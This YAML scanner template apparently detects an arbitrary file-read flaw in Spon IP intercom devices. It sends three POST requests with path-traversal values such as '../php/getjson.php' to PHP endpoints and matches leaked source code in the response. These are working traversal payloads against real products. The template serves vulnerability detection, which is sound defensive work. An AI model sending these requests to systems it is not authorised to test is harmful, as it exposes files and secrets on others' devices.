expression: r1() || r2() || r3()
id: spon-ip-intercom-file-read
info:
  author: york
  name: Spon Ip Intercom File Read
  severity: high
rules:
  r1:
    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
    request:
      body: 'jsondata[url]=../php/getjson.php

        '
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      method: POST
      path: /php/rj_get_token.php
  r2:
    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
    request:
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      method: POST
      path: /php/exportrecord.php?downname=../php/getjson.php
  r3:
    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
    request:
      body: 'jsondata[filename]=../php/getjson.php

        '
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      method: POST
      path: /php/getjson.php
